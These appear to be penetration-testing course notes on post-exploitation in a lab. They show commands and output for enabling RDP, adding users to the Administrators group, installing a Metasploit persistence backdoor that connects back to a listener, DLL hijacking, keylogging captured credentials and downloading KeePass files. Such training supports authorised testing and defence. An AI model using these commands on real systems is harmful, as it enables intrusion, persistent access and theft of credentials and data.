    Another very useful tool that we can use in this step is [WCE][http://www.ampliasecurity.com/research/windows-credentials-editor/] (Windows Credentials Editor). Since it is a windows binary, you will have to upload it on the remote machine and then run it from the meterpreter session.
      ```
      meterpreter > execute -i -f wce.exe -a -h
      Process 3628 created.
      Channel 4 created.

      Options:

              -s       Changes NTLM credentials of current logon session.
                       Parameters: <UserName>:<DomainName>:<LMHash>:<NTHash>.
              -r       List logon sessions and NTLM credentials indefinitely.
                       Refreshes every 5 seconds if new sessions are found.
                       Optional: -r<refresh interval>.
              -c       Run <cmd> in a new session with the specified NTLM credentials.
                       Paramters: <cmd>
              -e       Lists logons sessions NTLM credentials indefinitely.
      ```

      We will not dig deeper into this tool, but as you can see from its help manual, it offers many options and commands to work with windows credentials, logon sessions, Kerberos, and so on.

      We suggest you try it in a test environment in order to get familiar with it.

    At this time we should have a set of working credentials.
    What we want to do now is to check if the RDP Service is active on the target, since we want to use it for backdoor access.

    We already have a session on the remote machine and we can check enabled services by running the following command:
      ```
      net start
      ```

      **Note:**
        Remember that you can open a Windows command prompt from a Meterpreter shell by running the following command: `shell`

    Here is an example of what you can get with the `net start` command:
      ```
      C:\Windows\system32> net start
      net start
      These Windows services are started:

        Application Experience
        Application Information
        Background Intelligent Transfer Service
        Base Filtering Service
        ...
        Remote Desktop Configuration
        Remote Desktop Services
        Remote Desktop Services UserMode Port Redirector
      ```

      **Note:**
          There are many different commands we can use to check if a specific service is enabled or not.
          For example we can use the Windows Management Instrumentation Command-line ([WMIC][https://msdn.microsoft.com/en-us/library/bb742610.aspx]) tool as follows:
            ```
            wmic service where 'Caption like "Remote%" and started=true' get Caption
            Caption
            Remote Procedure Call (RPC)
            Remote Desktop Configuration
            Remote Desktop Services
            Remote Desktop Services UserMode Port Redirector
            ```

          We can also use meterpreter scripts to check services, such as `service_manager` and `enum_services`:
            ```
            run service_manager -1
            ```
            ```
            run post/windows/gather/enum_services
            ```

          Result:
            ```
            [*] Listing Services Info for matching services, please wait...
            [+] New service credentials detected: AeLookupSvc is running as ``

            AeLookupSvc  localSystem                 Manual    C:\Windows\System32\svchost.exe         
            ApoIDSvc     NT Authority\LocalService   Manual     C:\Windows\System32\svchost.exe
            ```

    Now that we know if RDP is enabled or not, let's suppose it is disabled and enabled it.
    Once again we can do it directly from a Windows shell or via meterpreter scripts.
    The script we are going to use is called `getgui`:
      ```
      meterpreter > run getgui -h
      Windows Remote Desktop Enabler Meterpreter Script
      Usage: getgui -u <username> -p <password>

      OPTIONS:
          -e        Enable RDP only.
          -f <opt>  Forward RDP Connection.
          -h        Help menu.
          -p <opt>  The Password of the user to add.
          -u <opt>  The Username of the user to add.
      ```

    As we can see from the previous output we can simply enable RDP with the `-e` option, but we can also add a new user and password with `-p` and `-u`:
      ```
      meterpreter > run getgui -e
      [*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
      [*] Carloz Perez carloz_perez@darkoperator.com
      [*] Enabling Remote Desktop
      [*]    RDP is disabled; enabling it ...
      [*] Setting Terminal Services service startup mode
      [*]    The Terminal Services service is not set to auto, changing it to auto ...
      [*]    Opening port in local firewall if necessary
      [*] For cleanup use command: run multi_console_command -rc /root./msf5/logs/scr
      meterpreter >
      ```

      Here we can see we have successfully enabled RDP and we also set it automatically starts when the user logs in.

    Enabling RDP on the machine is not all.
    If the target user (the one we know the credentials for) is not allowed to connect through RDP, we will have to grant him this privilege by adding him to the Remote Desktop Users group.
    Moreover we have to be sure that Windows firewall does not block the connections.

    We assume that this group can log in to RDP, in other words that "Allow log on through Remote Desktop Services" Local policy is assigned to the Remote Users group. (See img-132)
    If the box is hardened this might not be the case.

    From the Windows shell we can issue the command:
      ```
      net localgroup "Remote Desktop Users" els_user /add
      ```
      where `Remote Desktop User` is the name of the local group we want to add the user to and `els_user` is the username.

    If the command succeed we will get something like this:
      ```
      C:\Windows\system32>net localgroup "Remote Desktop Users" els_user /add net localgroup "Remote Desktop Users" els_user /add
      The command completed successfully.
      ```

    The following snapshots show what happens before and after the command (see img-134)(Picture of victim's remote desktop users being added with us)

    We can now check that everything works by trying to establish an RDP connection to the target machine:
      ```
      rdesktop [IP_ADDRESS] -u [USERNAME] -p [PWD]
      ```
      Example:
      ```
      stduser@els:~$ rdesktop 192.168.102.157 -u els_user -p els_pwd
      Autoselected keyboard map en-us
      ERROR: CredSSP: Initialize failed, do you have the correct kerberos tgt initialized ?
      Connection establishing using SSL.
      WARNING: Remote desktop does not support colour depth 24; falling back to 16
      ```

    **Note:**
      We can use the `net` command to list groups and add users into them.
      Let's see first how to list all groups with the `net localgroup` command:
        ```
        -----------------------------------------------------------------------
        *Administrators
        *Backup Operators
        *Cryptographic Operators
        *Distributed COM Users
        *Event Log Readers
        *Guests
        *IIS_IUSRS
        *Network Configuration Operators
        *Performance Log Users
        *Power Users
        *Remote Desktop Users
        ```

      If we want to list users within a specific group we just need to add the name of the group at the end of the previous command.
      For example let's list users in the RPD group:
        ```
        net localgroup "Remote Desktop Users"
        Alias name    Remote Desktop Users
        Comment       Members in this group are granted the right to logon remotely

        Members
        ---------------------------------------------------------------------------
        els_user
        The command completed successfully.
        ```
    Now that we have the groups list, we could add the user to one of them.
      For example we can grant *Standard Users* with *Administrator* privileges, by simply adding them in the *Administrator* group. (see img-138)
      ```
      C:\Users\els\Downloads>net localgroup "Administrators" stduser /add
      net localgroup "Administrators" stduser /add
      The command completed successfully.
      ```

    Note that you can do the previous steps for all the groups listed before.
      For example, if you want a remote shell on the system, instead of RDP, you can make sure that Telnet service is enabled, and that your user is in the "*TelnetClients*" group.
      This way you can connect back again through Telnet with the same username and password.

2. Backdoor
    Our goal is to use Metasploit in order to generate an executable file (backdoor) that will persist through reboots of the victim machine.

    Note that we are going to use connect-back backdoors, which means that it will be the victim machine that initiates the connection.

    This way, we will avoid issues with dynamic IP addresses or firewalls in the middle.

    The disadvantage is that the backdoor will always try a connection to the same IP address and port unless you use a host name obtained through some free DNS service like:
      - [http://freedns.afraid.org/][http://freedns.afraid.org/]
      - [http://www.zoneedit.com/dynamicDNS.html][http://www.zoneedit.com/dynamicDNS.html]
      - [http://xname.org/][http://xname.org/]

    Note: this is the same technique that most malware use and ensures that you can change the binding on the DNS management panel to the point to your IP address.

    The exploitation process works this way:
      1. Upload the backdoor on the victim
      2. Execute the file
          - At prefixed times (i.e. 5-6-10 seconds), it will try to connect back to our listener
      3. Run it automatically at boot
          - Depending on the OS, this can be done by editing the Windows registry, services, schedules, rc.local, init.d

    Thanks to Metasploit, the entire process can be completely automated.
      We do not have to worry about scripting the file, uploading it or editing the registers and services.
      What we have to do once we have the meterpreter session, is run one of the scripts we will see in the next sections and then, each time we want to connect back, start a listener on our machine.

      Notice that the script only works against Windows machine.

  - Persistence
    Before running the script. let us see what options it offers.
    We can do this from the meterpreter session by running:
      ```
      run persistence -h
      ```
      Example:
      ```
      meterpreter > run persistence -h
      Meterpreter Script for creating a persistent backdoor on a target host.

      OPTIONS:

        -A        Automatically start a matching exploit/multi/handler to connect to the agent
        -L <opt>  Location in target host to write payload to, if none %TEMP%, will be used
        -P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp
        -S        Automatically start the agent on boot as a service (with SYSTEM privileges)
        -T <opt>  Alternate executable template to use
        -U        Automatically start the agent when the User logs on
        -X        Automatically start the agent when the system boots
        -h        This help menu
        -i <opt>  The interval in seconds between each connection attempt
        -p <opt>  The port on which the system running Metasploit is listening  
        -r <opt>  The IP of the system running Metasploit listening for connection back
      ```

      As we can see from the previous example, we can customize the script and choose where to upload the file, which payload to use, the interval between each connection attempt, how to start the backdoor and so on.

      Let us see which options we will use in order to configure it correctly:
        - `-A` starts the handler on our machine
        - `-X` start the agent at boot
        - `-i 5` connection attempt each 5 seconds
        - `-p 8080` the port for the connect back
        - `-r [IP_Address]` our IP address

      Once we run it, the script output will look like this. As you can see the script automatically creates the backdoor, uploads it and sets the registry keys to start it at boot.

    The steps in detail are as follows:
      1. Creating the Payload
      2. Uploading the backdoor file
      3. Executing the backdoor
      4. add the entry in the windows registry

    Let's double check that the changes are real. Let's first get the registry value with the `reg` command and then list the files in the path where the backdoor has been uploaded:
      ```
      meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v nZvDeQvFvEi
      Key: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
      Name: nZvDeQvFvEi
      Type: REG_SZ
      Data: C:\Windows\TEMP\flKiuvjYDY.vbs
      meterpreter > ls C:\\Windows\\TEMP\\fl*
      Listing: C:\Windows\TEMP\fl*
      ============================

      Mode              Size    Type  Last modified             Name
      ----              ----    ----  -------------             ----
      100666/rw-rw-rw-  148427  fil   2016-02-29 11:25:42 -0500 flKiuvjYDY.vbs
      ```

    Once the process is complete, if we want to get a session on the target machine, we have to start the listener and wait for incoming connections.
      We can do it by using the `exploit/multi/handler` module.

      Notice that we have to set the same options set with persistence: same payload, IP address, and local port.
      ```
      msf exploit(handler) > exploit

      [*] Started reverse TCP handler on 192.168.102.147:8080
      [*] Starting the payload handler...
      [*] Sending stage (957487 bytes) to 192.168.102.157
      [*] Meterpreter session 14 opened (192.168.102.147:8080 -> 192.168.102.157:1039) at 2016-02-29 11:29:55 -0500
      ```

    In this way each time you need a meterpreter session on the target machine, we only need to start the handler and wait for the victim to connect back.

    Since we edited the Windows Registry to start the script at the system boot, we will be able to create the session each time the machine is booted.

  - Manual Installation
    Supposed we crafted our own backdoor with **msfvenom** or any other tool such as [Veil][https://github.com/Veil-Framework/] or [BDF][https://github.com/secretsquirrel/the-backdoor-factory]. Here are the commands to upload, and edit the Registry Keys on your target machine with meterpreter: (see img-155 for results)
      1. Upload the file into the victim machine:
          ```
          upload [path_to_backdoor_file] [path_on_target]
          ```
          Example:
          ```
          upload /root/my_bd.exe D:\\windows
          ```

      2. Edit the Windows Registry Key with the reg command, in order to load your file at startup:
          ```
          reg setval -k [registry_key_path] -d [value_of_the_key] -v [name_of_the_key]
          ```
          Example:
          ```
          reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -d "C:\Windows\my_bd.exe" -v bd_name
          ```

3. New Users      
    An easy way to create a new user in the system is by running `net user` and `net localgroup` commands.

    Once you create a new user for yourself, you have to join groups that allow you access to services such as RDP or Telnet and so on.

    We have already seen this in the previous slides, so we will jump over these steps.

    Another method we can use for maintaining access in many cases, but also for privilege escalation in other, is known as DLL Hijacking, [DLL Preloading][https://support.microsoft.com/en-us/help/2389418/secure-loading-of-libraries-to-prevent-dll-preloading-attacks], or Insecure Library Loading

    **DLL Hijacking/Preloading**
    DLL Hijacking allow us the ability to abuse a built-in behavior in the way that executables, when launched, search for Dynamic Link Libraries (DLLs) to import.
    This behavior is known as [DLL Search Order][https://msdn.microsoft.com/en-us/library/windows/desktop/ms682586(v=vs.85).aspx].

    When a program is launched, the DLL Search Order in most cases is as follows:
      1. The directory from which the application was launched
      2. The `C:\Windows\System32` directory
      3. The 16-bit Windows system directory (i.e, `C:\windows\system`)
      4. The Windows directory (`C:\windows`)
      5. The current directory at the time of execution
      6. Any directories specified by the %PATH% environment variable

    As an example to help clarify, let's briefly revisit [a recent case][https://packetstormsecurity.com/files/146325/msskype-dllhijack.txt] of DLL Hijacking in Microsoft's popular communication software, Skype, which when exploited, resulted in a low-privileged user obtaining SYSTEM-level privileges.  

      Skype, uses a proprietary update mechanism in order to deliver updates to the software, which runs when first installed, and then also runs periodically to check for updates.

      When it does so, it launches a second binary (`Updater.exe`) from within the "`%ProgramFiles%\Skype\Updater`" directory, which is launched as SYSTEM.

      This "`Updater.exe`" component, when it finds an update for Skype, would copy or extract a new version of the binary to the "`%systemroot%\Temp`" directory as a file named "`SKY<abcd>.tmp`" which the `Updater.exe` component would then launch as a separate process.

      It was then found that the newly created `%systemroot%\Temp\SKY<abcd>.tmp` executable, when launched by the **Updater.exe** component, would also look for a DLL in the same Temp directory called "`UXTheme.dll`", and attempt to import it.

      Since an attacker could write to the "`%systemroot%\Temp`" directory, it was trivial to replace the `UXTheme.dll` with a malicious copy and take control of the target as SYSTEM.

    Another [example of this][https://www.obscurechannel.com/x42/slack.html], where an application executes another process in order to fetch updates and results in DLL hijacking, was in the popular [Slack][https://en.wikipedia.org/wiki/Slack_(software)] messaging platform.

      Although this particular example didn't result in privilege escalation, rather it resulted in obtaining a reverse shell as the current user, and also offered a method of persistence every time the user would launch the "Check for Updates" command from within the Slack client or when the user would simply launch the Slack client.

      When launching the Slack executable on Windows, it would search for a DLL called "**DNSAPI.dll**" from within the `%localappdata%\slack` directory. Since we can write to, or modify files within this directory, it was trivial to replace the **DNSAPI.dll** with our own malicious copy.

      Our malicious DLL would then be executed whenever the user clicked on the "Check for Updates" option or when the application itself checked for updates periodically, and results in a meterpreter session. (see img-171)

      You can read more about it [here][https://www.obscurechannel.com/x42/slack.html]

    There are just a couple examples of [hundreds][https://www.exploit-db.com/dll-hijacking-vulnerable-applications/] of applications that are vulnerable to DLL hijacking.

    Finding these instances of vulnerable applications can be done through either manual methods, or using scripts that can help us find these vulnerable applications and DLLs.

    One tool we will cover in Labs and Videos accompanying this module, is the "[Process Monitor][https://docs.microsoft.com/en-us/sysinternals/downloads/procmon]" utility from the SysInternals Suite. Using Process Monitor, we can easily identify such applications, and DLLs we can use for this class of vulnerability. (see img-174-177)

    The process for manually identifying typical DLL Hijacking opportunities using Process Monitor (procmon) can be summarized as follows:
      1. Create a procmon filter for a specific executable we'd like to investigate, (in this case "RegSrvc.exe"), and also, create a filter for "NAME NOT FOUND" for the Result column do we can quickly filter on relevant entries.

      2. Identify cases where the application is looking for a DLL in a directory which we can write to, or modify.

      3. Drop out modified payload in the writeable directory

      4. Restart the Service, re-launch the application, or wait for the system to be rebooted in the case the executable is in fact associated with a service that starts at boot time, or alternatively, wait for the user to launch the affected application.

(see vids-181,182)


__________________________
## 6.3. Pillaging / Data Harvesting
Once we have built our way into the victim machine, we can move on to the next phase: Data Harvesting / Pillaging.

Pillaging is the step in which you access sensitive data and intellectual property of the target organization.

Demonstrating the feasibility of an external hacker accessing this information might be the goal of the overall engagement, so this phase is critical.

However, according to the type of machine you have compromised, you may or may not find what you are looking for. This presents the need to further exploit and infiltrate the network.

Therefore in this step we will also harvest data and information necessary for this purpose.

This encompasses getting local information such as files, enumerating credentials, accounts, IM logs, and more, but also network information such as internal network blocks in use, domains, intranet servers, shared hard drives, printers, repositories, and so on.

Network information will also be used in the Mapping the internal network phase.

**Important**
  Since there is an infinite list of commands that we can run on the target machines, we will not list all of them here. Instead, we will see the most important and then we will give you some references at the end of this section.

  The important thing to remember here is that we need to get as much [information][http://www.pentest-standard.org/index.php/Post_Exploitation#Pillaging] as we can: system info, applications, services, networks, documents, messaging, and so on.

In the next sections we will see a list of scripts and commands related to data harvesting, that a penetration testers could use through a meterpreter session or shell.

Notice that we have already seen some of these scripts in previous phases, but for different purposes. We will still mention them here since they are very important for the success of this step.

Let us start harvesting basic information about the system.
- `sysinfo`
  With `sysinfo` command we are able to get basic information about the remote system. Notice that the script works both on Windows and Linux OS.
    ```
    meterpreter > sysinfo
    Computer        : ELS
    OS              : Windows 7 (Build 7601, Service Pack 1)
    Architecture    : x64 (Current Process is WOW64)
    System Language : en_US
    Domain          : WORKGROUP
    Logged On Users : 2
    Meterpreter     : x86/win32
    ```

- `getuid`
  With `getuid`, we can check the user that we are running as on the target machine.
    ```
    meterpreter > getuid
    Server username: uid=1000, gid=1000, euid=1000, egid=1000, suid=1000, sgid=1000
    ```
    ```
    meterpreter > getuid
    Server username: els\els
    ```

Starting from this information, we can already start making assumption about the role of the victim machine.

For example, if the previous command show us that the victim machine is a server, one of the most important things to check is which services are running on it.

In other words, we have to figure out the role of the machine in the remote network.

You should try to get answers to questions like:
- Is this a workstation?
  - Which department is it from?
    - R&D?
    - Marketing?
    - ...
- Is this a server?
  - What server?
    - Mail server?
    - Web server?
    - RADIUS?
    - ...

During the *Pillaging* step, we should be able to give an accurate answer to those questions according to the information we get on the system.

Let us start uncovering some of the commands we can run to collect more information.

  Metasploit already implements some enumeration scripts that could be used for this purpose:
    - `run /post/windows/gather/`
        Result:
        ```
        meterpreter > run post/windows/gather/
        Display all 106 possibilites? (y or n)
        run post/windows/gather/arp_scanner
        run post/windows/gather/bitcoin_jacker
        run post/windows/gather/cachedump
        run post/windows/gather/checkvm
        ```
    - `run /post/linux/gather/`
        Result:
        ```
        run post/windows/gather/arp_scanner
        run post/windows/gather/bitcoin_jacker
        run post/windows/gather/cachedump
        run post/windows/gather/checkvm
        ```

    Notice that the previous scripts contain predefined sets of shell commands that will be run on the target machine in order to get the correct information. (see img-195?)

  Although they are very useful and will save us a lot of time, we can use Windows or Unix commands from an interactive shell in order to get the same results.
    For example, let us first run the `enum_services` scripts and then check how we can get similar results from a shell.
    ```
    [*] Listing Services Info for matching services, please wait...
    [+] New service credentials detected: AeLookupSvc is running as ``
    [+] New service credentials detected: ALG is running as 'NT AUTHORITY\LocalService'
    [+] New service credentials detected: aspnet_state is running as 'NT AUTHORITY\NetworkService'
    Services
    ========

    Name         Credentials                 Command   Startup
    ----         -----------                 -------   -------
    ALD          NT AUTHORITY\LocalService   Manual    C:\Windows\System32\alg.exe
    AeLookupSvc  localSystem                 Manual    C:\Windows\System32\svchost.exe         
    ApoIDSvc     NT Authority\LocalService   Manual     C:\Windows\System32\svchost.exe
    ```

    As you can see, with a single command we het a list of all services on the remote machine, the user associated with each of them, the startup type, and also the path to the binary.
    The same information can be obtained on the machine, by opening the *Services* configuration windows (see img-197).

**Important**
    It is important to know that many post exploitation scripts are implemented as modules and can be used outside the meterpreter session.

    We just need to select the module with the `use` command, configure its options with `set`, and then execute the module with `run`.

    Let us see an example based on `enum_services`.

    We will get the same results obtained before, but we can also configure the module according to our needs.
      ```
      msf > use/post/windows/gather/enum_services
      msf post(enum_services) > show options

          Name      Current Setting   Required  Description
          ----      ---------------   --------  -----------
          CRED                        no        String to search credentials for
          PATH                        no        String to search path for
          SESSION   2                 yes       The session to run this module on
          TYPE      All               yes       Service startup Option (Accepted: All, Auto, Manual, Disabled)

      msf post(enum_services) > run
      ```

As we said before, post exploitation scripts and modules usually contain and execute a well-defined set of OS commands. In other words, we can get similar information by running the correct commands from a shell terminal on the target machine.

- `wmic`
  In the previous case we can get services information with the `wmic` command.
  As we can see we get similar information.
  Example:
    ```
    C:\Users\els\Downloads>wmic service get Caption,StartName,State,pathName
    wmic service get Caption,StartName,State,pathname
    Caption                            StartName                  State     PathName
    Application Experience             localSystem                Running   C:\Windows\system32\svchost.exe -k netsvcs
    Application Layer Gateway Service  NT AUTHORITY\LocalService  Stopped   C:\Windows\system32\alg.exe
    Application Identity               NT Authority\LocalService  Stopped   C:\Windows\system32\svchost.exe -k LocalServcieAndNoImpersonation
    ```

- `net start`
  Another useful command that we can use to list services that are currently running is `net start`. Inspecting the results of these commands gives us a better idea of the machine role. Inspecting the results of these commands gives us a better idea of the machine role. For example, services like `DNS` or `IIS` tell us that the exploited machine have a server role.

    ```
    C:\Windows\system32> net start
    net start
    These Windows services are started:

      Application Experience
      Application Information
      Background Intelligent Transfer Service
      Base Filtering Service
      ...
      Remote Desktop Configuration
      Remote Desktop Services
      Remote Desktop Services UserMode Port Redirector
    ```

- `service --status-all`
  As you can imagine, these commands rely on the OS we are dealing with.
  For example if we want a list of services running on the exploited Linux machine, we will run `service --status-all`

  Example:
    ```
    meterpreter > shell
    Process 9852 created.
    Channel 1 created.
    $ service --status-all
      [+] acpid
      [-] anacron
      [+] apache
    ```

- `ps`
  In addition to services running on the machine, listing running process could also be very useful to understand the role of the machine. The easiest way to check them is by running the `ps` command on the meterpreter.

Some critical information to retrieve in a Windows networked environment, is if the compromised machine is part of a domain, or even, if it is a domain controller.
- `net view/domain`
  To gather this information we can run the command `net view/domain` or run the script named `enum_domains`.

  Here is an example of what we may get. In this case the machine is in the domain `ELSLAB` and we also know the name of the Domain Controller.
    ```
    C:\Users\els\Downloads>net view /domain
    net view /domain
    Domain

    -----------------------------------------------------------------------------
    ELSLAB
    The command completed successfully.


    C:\Users\els\Downloads>^C
    Terminate channel 2? [y/N]   y
    meterpreter > run post/windows/gather/enum_domains

    [*] Enumerating DCs for ELSLAB
    [+] Domain Controller: WIN-2QH87UNDLTR
    ```

- `net group "Domain Controllers" /domain`
  We can also print the list of Domain Controllers with the following command:
    ```
    C:\Windows\system32>net group "Domain Controllers" /domain
    net group "Domain Controllers" /domain

    Group name      Domain Controllers                      Members
    Comment         All domain controllers in the domain

    ----------------------------------------------------------------------------
    WIN-2QH87UNDLTR$
    The command completed successfully.
    ```

Let us now focus on which command we can use to get information about users.
- `net user` (Windows) and `cat /etc/passwd` (Linux)
  With these commands we are able to list users on the system.
    ```
    C:\Windows\system32>net user
    net user

    User accounts for \\

    -----------------------------------------------------------------------------
    Administrator         els                     els_user
    EveUser               Guest                   stduser
    user                  
    The command completed with one or more errors.
    ```
    ```
    # cat /etc/passwd
    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    bin:x:2:2:bin:/bin:/usr/sbin/nologin
    sys:x:3:3:sys:/dev:/sbin/nologin
    ```

- `run post/windows/gather/enum_ad_users`
  Notice that since the Windows machine is part of a domain, we can also use meterpreter scripts to enumerate accounts and other information in the default active domain:
    ```
    meterpreter > run post/windows/gather/enum_ad_users

    Domain Users
    ============

      sAMAccountName   name           userPrincipalName   userAccountControl  lockoutTime   mail    primarygroupid
      --------------   ----           -----------------   ------------------  -----------   ----    --------------
      Administrator    Administrator                      512                                       513
      Guest            Guest                              66082                                     514
    ```

- `net user /domain`
  Similar information can be obtained with the `net user /domain` command.
  Remember that most of the scripts automate and organize information that can be gathered with shell commands.
    ```
    C:\Windows\system32>net user /domain
    net user /domain
    The request will be processed at a domain controller for domain eLSLab.local.


    User accounts for \\WIN-2QH87UNDLTR.eLSLab.local

    ----------------------------------------------------------------------------
    Administrator         Francesco       Guest         krbgt

    The command completed with one or more errors.
    ```

- `net localgroup`
  Moreover we can check which groups exist on the machine or which users are within a group with the `net localgroup [group_name]` command.
    ```
    C:\Usrs\els\Downloads>net localgroup
    net localgroup

    Aliases for \\ELS

    ----------------------------------------------------------------------------
    *Administrators
    *Backup Operators
    *Cryptographic Operators
    *Distributed COM Users
    ```
    ```
    C:\Usrs\els\Downloads>net localgroup Administrators
    net localgroup Administrators
    Alias name     Administrators
    Comment        Administrators have completed and unresticted

    Members

    ----------------------------------------------------------------------------
    *Administrators
    *Backup Operators
    *Cryptographic Operators
    *Distributed COM Users
    ```

- `net share` and `enum_shares`
  The last command we will see is useful to display all the resources shared on the victim.

  We can use `net share` from the command prompt or `enum_share` from meterpreter.
    ```
    C:\Users\els\Downloads>net share
    net share

    Share name      Resource                      Remark
    ----------      --------                      ------
    C$              C:\                           Default share
    IPC$                                          Remote IPC
    ADMIN$          C:\Windows                    Remote Admin
    test            C:\Users\els\Documents\test
    Users           C:\Users
    The command completed successfully
    ```
    ```
    meterpreter > run enum_shares
    [*]
    [*] The following shares were found:
    [*]     Name: test
    [*]     Path: C:\Users\els\Documents\test
    [*]     Type: 0
    [*]
    [*]     Name: Users
    [*]     Path: C:\Users

    [*]
    [*] Recent UNC paths entered in Run Dialog found:
    [*]     \\192.168.102.147\1
    ```

The list of commands in this section is just a small fraction of the ones that are available in Meterpreter or in the OS shells.

For example we did not yet gather networking information such as IP addresses, ARP tables, DNS, current connections, and so on. In addition to this information, we also still need to check installed applications and local files.

as you have already seen, you have a number of different commands and methods to retrieve information, depending on the victim OS.

Showing all of them is merely impossible, but fellow pentesters have shared a few documents with us **listing all potential** commands for:  
- [Windows][https://docs.google.com/document/d/1U10isynOpQtrIK6ChuReu-K1WHTJm4fgG3joiuz43rw/edit?hl=en_US]
- [Linux][https://docs.google.com/document/d/1ObQB6hmVvRPCgPTRZM5NMH034VDM-1N-EWPRz2770K4/edit?hl=en_US]
-  [OSX][https://docs.google.com/document/d/10AUm_zUdAQGgoHNo_eS0SO1K-24VVYnulUD2x3rJD3k/edit?hl=en_US]
-  [Metasploit][https://docs.google.com/document/d/1ZrDJMQkrp_YbU_9Ni9wMNF2m3nIPEA_kekqqqA2Ywto/edit?pref=2&pli=1].

At the following [link][https://github.com/mubix/post-exploitation-wiki] you can find a few more links containing post-exploitation commands. You can also download them locally and access it from a web browser.

Notice that there are many other lists available online. [Here][http://tim3warri0r.blogspot.it/] and [Here][https://n0where.net/linux-post-exploitation/] you can find a few more commands to run on Windows and Linux/Unix/BSD machine.

  We strongly suggest you take a look at these documents in order to understand what type of commands and information you may need to gather from exploited machines.

Before seeing how to harvest files from the victim, it is useful to know that Metasploit implements scripts that automatically retrieve information from the system. The two main scripts that we can use against Windows machines are
  - `scraper` <br>
    harvests system info including network shares, registry hives, and password hashes

  - `winenum` <br>
    retrieves all kinds of information about the system including environment variables, network interfaces routing, user accounts, and much more.

  If we inspect the code of these 2 scripts, we can see the list of commands that they will run on the remote machine (see img-218)

  Notice that they will automatically save all information gathered into local files, so we can inspect them later.
    ```
    meterpreter > run winenum
    [*] Running Windows Local Enumeration Meterpreter Script
    [*] New session on 192.168.102.157:47451...
    [*] Saving general report to /root/.msf5/logs/scripts/winenum/ELS_20160303.5433/ELS_20160303.5433.txt
    [*] Checking if ELS is a Virtual Machine ........
    [*]     This is a VMware Workstation/Fusion Virtual Machine
    [*]     UAC is Disabled
    [*] Running Command List ...
    [*]     running command arp -a
    [*]     running command cmd.exe /c set
    [*]     running command ipconfig /all
    ```

Once we have information about the system, networks, users, groups, services, and so on, we can start getting not only actual files and documents, but also keystrokes.
  We will look for usernames, passwords, IM logs, private documents, and so on.

  Metasploit offers some great scripts that could be used in this step.
  For example with `screenshoot` command we are able to get the screen of the victim. (see img-221)

  Another way to get sensitive information from the target machine is by running a keylogger. Although there are many keylogger tools that we can use and install on the remote machine, Metasploit also offers a few scripts to do this:
  `keyscan_start` and `keylogrecorder`

    It is important to know that depending on the privileges we have on the remote machine and the process we are attached to, different keystrokes can be logged.

    For example, if we want to log credentials typed when the user unlocks the screen we will have to attach the session to the `winlogon.exe` process (which runs on SYSTEM).

    On the other side, if we want to dump keystrokes while the user uses applications and so on, we will have to attach the process `explorer.exe` (which runs on user level).

  Let us see how the 2 script works:
  - `keyscan_start`, `keystart_dump`, `winlogon.exe`
    The first script we are going to use is `keystart_scan`.
    Notice that we already migrated in `explorer.exe`
      ```
      meterpreter > getpid
      Current pid: 3012
      meterpreter > keyscan_start
      Starting the keystroke sniffer...
      meterpreter >
      ```
      Once the sniffer is running we just have to wait for the user to type something on the keyboard.

    Notice that the keystrokes will not be automatically printed on the screen. Instead we have to run `keyscan_dump` to see them.
      ```
      meterpreter > keyscan_dump
      Dumping captured keystrokes...
      bank of america <Return> elstarget <Tab> MyStringPwd23454_ <Return>
      ```

      As we can see, it seems the user typed `bank of america` and then some credentials. While the sniffer is running, we can dump the keystrokes by simply executing `keyscan_dump`. To stop the sniffer we just need to run `keyscan_stop`


    Let's now migrate to `winlogon.exe` and try to dump the user login credentials.
      ```
      PID   PPID  Name          Arch  Session   User                  Path
      ---   ----  ----          ----  -------   ----                  ----
      500   412   winlogon.exe  x64   1         NT AUTHORITY\SYSTEM   C:\Windows\syst

      meterpreter > getpid
      Current pid: 500
      meterpreter > keyscan_start
      Starting the keystroke sniffer...
      meterpreter > keyscan_dump
      Dumping captured keystrokes...

      meterpreter > keyscan_dump
      Dumping captured keystrokes...

      meterpreter > keyscan_dump
      Dumping captured keystrokes...
       <Ctrl>  <LCtrl>  <Insert>  <Ctrl>  <LCtrl>  <Alt>  <LMenu>  <Delete> els <Return>
      meterpreter >
      ```

  - `keylogrecorder`
    The next script we want to use is `keylogrecorder`:
      ```
      meterpreter > run keylogrecorder -h
      Keylogger Recorder Meterpreter Script
      This script will start the Meterpreter Keylogger and save all keys in a log file for later analysis. To stop capture hit Ctrl-C
      Usage:
      OPTIONS:

        -c <opt>  Type of key capture. (0) for user key presses, (1) for winlogon credential capture, or (2) for no migration. Default is 2.
        -h        Help menu
        -k        Kill old Process
        -l        Lock screen when capturing Winlogon credentials
        -t <opt>  Time interval in seconds between recollection of keystrokes, default 30 seconds
      ```
      As we can see, with the `-c` option we can instruct the script which type of key to capture (user or `winlogon`)

    Different form previous script, `keylogrecorder` automatically migrates to the correct process, but it also stores all the keystrokes into a local file.
      ```
      meterpreter > run keylogrecorder -c 0
      [*]     explorer.exe Process found, migrating into 3012
      [*] Migration Successful!!
      [*] Starting the keystroke sniffer...
      [*] Keystrokes being saved in to /root/.msf5/logs/scripts/keylogrecorder/192.168.102.157_20160303.4055.txt
      [*] Recording
      ```

      In order to see the keystrokes we just need to open the file stored in the Metasploit logs folder.

Now let's see a few commands that allows us to list files, create files, folders, move between directories, and so on.
  From the meterpreter help manual we can see the list of commands that are implemented.
    ```
    Stdapi: File system Commands
    ============================

      Command         Description
      -------         -----------
      cat             Read the contents of a file to the screen
      cd              Change directory
      download        Download a file or directory
      edit            Edit a file
      getlwd          Print local working directory
      getwd           Print working directory
      ...
    ```

  It does not matter the OS of the exploited machine. These commands work the same way. For example, with the commands `pwd` and `getwd` we are able to get the working directory and then we could list files.

    Thanks to these commands (`search`, `download`, etc) we are able to search and download files like Web Browser cache, IM logs, documents, email files, PGP keys, specific program files like KeePass databases, and so on.

  Let's suppose we want to search for a specific file extension such as KeePass database file. We can do this with the following command:
    ```
    search -d C:\\Users\\els\\ -f *.kdbx
    ```
    Description:
    - `-d` is the path where to begin searching from
    - `-f` is the file pattern to search

  Once we have located the file we need, we can download it to our machine with the command `download`. We can use this command to retrieve all the files we need.
